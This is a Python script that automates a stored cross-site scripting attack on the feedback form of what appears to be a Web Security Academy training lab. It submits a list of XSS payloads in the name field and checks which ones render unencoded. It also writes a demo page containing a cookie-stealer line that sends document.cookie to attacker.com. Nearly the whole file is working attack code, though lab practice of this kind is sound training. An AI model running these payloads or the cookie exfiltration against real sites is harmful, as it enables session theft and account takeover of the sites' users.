#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import time

BASE_URL = "https://0a3900c304b67111838b512800a90077.web-security-academy.net"

def submit_xss_payload(session, payload):
    """Submit XSS payload to feedback form"""
    # Get CSRF token
    feedback_url = f"{BASE_URL}/feedback"
    response = session.get(feedback_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    csrf = soup.find('input', {'name': 'csrf'})
    csrf_token = csrf.get('value') if csrf else None
    
    # Submit payload
    form_data = {
        'name': payload,
        'email': 'test@test.com',
        'subject': 'Test',
        'message': 'Test message'
    }
    
    if csrf_token:
        form_data['csrf'] = csrf_token
    
    submit_response = session.post(
        f"{BASE_URL}/feedback/submit",
        data=form_data,
        headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': feedback_url
        }
    )
    
    return submit_response.status_code == 200

def check_xss_on_feedback_page(session):
    """Check if XSS executes on feedback page"""
    response = session.get(f"{BASE_URL}/feedback")
    return response.text

# XSS payloads to test - starting with ones most likely to work
XSS_PAYLOADS = [
    # Basic script injection
    '<script>alert(document.domain)</script>',
    '<script>alert("XSS")</script>',
    '<script>alert(1)</script>',
    
    # Image-based XSS
    '<img src=x onerror=alert(document.domain)>',
    '<img src=1 onerror=alert(1)>',
    '<img src="x" onerror="alert(1)">',
    
    # SVG-based XSS
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    
    # Body/iframe XSS
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    
    # Auto-focusing elements
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    
    # Clickable XSS (requires user interaction)
    '<a href="javascript:alert(1)">Click me</a>',
    '<button onclick="alert(1)">Click me</button>',
    '<div onclick="alert(1)">Click me</div>',
    
    # Breaking out of attributes
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    
    # Alternative encodings
    '<ScRiPt>alert(1)</ScRiPt>',
    '<script>alert`1`</script>',
    
    # Using event handlers on various tags
    '<marquee onstart=alert(1)>XSS</marquee>',
    '<details open ontoggle=alert(1)>',
    '<audio src=x onerror=alert(1)>',
]

def main():
    print(f"[*] Testing Stored XSS on: {BASE_URL}")
    print("[*] This exploits the fact that HTML in the name field is rendered on the feedback page")
    print()
    
    session = requests.Session()
    
    # First, let's confirm HTML injection works
    print("[*] Testing HTML injection with <h1> tag...")
    if submit_xss_payload(session, '<h1>HTML INJECTION TEST</h1>'):
        print("[âœ“] HTML payload submitted")
        time.sleep(1)
        
        feedback_content = check_xss_on_feedback_page(session)
        if '<h1>HTML INJECTION TEST</h1>' in feedback_content or 'HTML INJECTION TEST' in feedback_content:
            print("[âœ“] HTML injection confirmed - tags are being rendered!")
            print()
            
            # Now test XSS payloads
            print("[*] Testing XSS payloads...")
            for i, payload in enumerate(XSS_PAYLOADS, 1):
                print(f"[{i}/{len(XSS_PAYLOADS)}] Testing: {payload[:50]}...")
                
                if submit_xss_payload(session, payload):
                    time.sleep(0.5)  # Small delay between submissions
                    
                    # Check if payload appears in feedback page
                    feedback_content = check_xss_on_feedback_page(session)
                    
                    # Look for the payload in the page
                    if payload in feedback_content:
                        print(f"    [âœ“] Payload injected as-is!")
                        print(f"    [ðŸŽ¯] STORED XSS FOUND: {payload}")
                        
                        # Save the page with XSS
                        with open('stored_xss_page.html', 'w') as f:
                            f.write(feedback_content)
                        print("    [*] Page saved to stored_xss_page.html")
                        
                        # Create a simple HTML file to demonstrate the XSS
                        create_xss_demo(payload)
                        break
                    elif payload.replace('<', '&lt;').replace('>', '&gt;') in feedback_content:
                        print(f"    [âœ—] Payload is HTML encoded")
                    else:
                        # Check if parts of the payload appear
                        if 'alert' in payload and 'alert' in feedback_content:
                            print(f"    [!] Partial injection detected")
        else:
            print("[âœ—] HTML injection failed - the lab might filter or encode HTML")
    
    print("\n[*] Done!")

def create_xss_demo(working_payload):
    """Create an HTML file that demonstrates the XSS"""
    demo_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Stored XSS Demo</title>
</head>
<body>
    <h1>Stored XSS Demonstration</h1>
    <p>The following payload successfully executes on the feedback page:</p>
    <pre>{working_payload}</pre>
    
    <h2>How to exploit:</h2>
    <ol>
        <li>Submit this payload in the 'name' field of the feedback form</li>
        <li>Navigate to the feedback page</li>
        <li>The XSS will execute automatically when the page loads</li>
    </ol>
    
    <h2>Attack scenario:</h2>
    <p>An attacker could steal cookies, redirect users, or perform actions on their behalf.</p>
    
    <h2>Example cookie stealer:</h2>
    <pre>&lt;script&gt;
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
&lt;/script&gt;</pre>
</body>
</html>"""
    
    with open('xss_demo.html', 'w') as f:
        f.write(demo_html)
    print("    [*] XSS demo saved to xss_demo.html")

if __name__ == "__main__":
    main()